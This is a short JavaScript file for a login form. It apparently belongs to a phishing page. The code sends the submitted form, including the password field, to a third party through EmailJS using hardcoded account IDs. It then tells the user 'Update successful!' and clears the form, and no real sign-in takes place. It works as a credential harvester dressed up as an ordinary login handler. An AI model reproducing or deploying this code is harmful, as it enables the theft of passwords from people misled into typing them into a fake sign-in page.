// Initialize EmailJS with your User ID
(function(){
    emailjs.init("inryvIdMDYlJAEPpL"); // Replace "YOUR_USER_ID" with your actual EmailJS User ID
})();

// Button and Form Submission
const btn = document.getElementById('button');

document.getElementById('form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent traditional form submission

    btn.value = 'Processing...'; // Update button to show loading

    // Replace with your EmailJS IDs
    const serviceID = 'service_3h7tdpn'; // Replace 'YOUR_SERVICE_ID' with your actual EmailJS service ID
    const templateID = 'template_tp178k5'; // Replace 'YOUR_TEMPLATE_ID' with your actual EmailJS template ID

    // Log to confirm the submission is being intercepted
    console.log("Submitting form via EmailJS...");

    emailjs.sendForm(serviceID, templateID, this)
        .then(() => {
            btn.value = 'Login';
            alert('Update successful!');
            console.log("Update successful!");
        }, (err) => {
            btn.value = 'Login';
            console.error("Error:", err); // Log error details to the console
            alert(JSON.stringify(err)); // Show error message
        });

    this.reset(); // Clear form fields after submission
    return false; // Ensure form doesn’t submit
});

// Password Visibility Toggle
const togglePasswordButton = document.getElementById("toggle-password");
const closedEyeIcon = document.getElementById("closed-eye");
const openEyeIcon = document.getElementById("open-eye");
const passwordElement = document.getElementById("password");
let isPasswordVisible = false;

togglePasswordButton.addEventListener("click", function() {
    if (!isPasswordVisible) {
        passwordElement.type = "text"; // Show password
        openEyeIcon.classList.remove("hide");
        closedEyeIcon.classList.add("hide");
    } else {
        passwordElement.type = "password"; // Hide password
        closedEyeIcon.classList.remove("hide");
        openEyeIcon.classList.add("hide");
    }
    isPasswordVisible = !isPasswordVisible; // Toggle visibility state
});
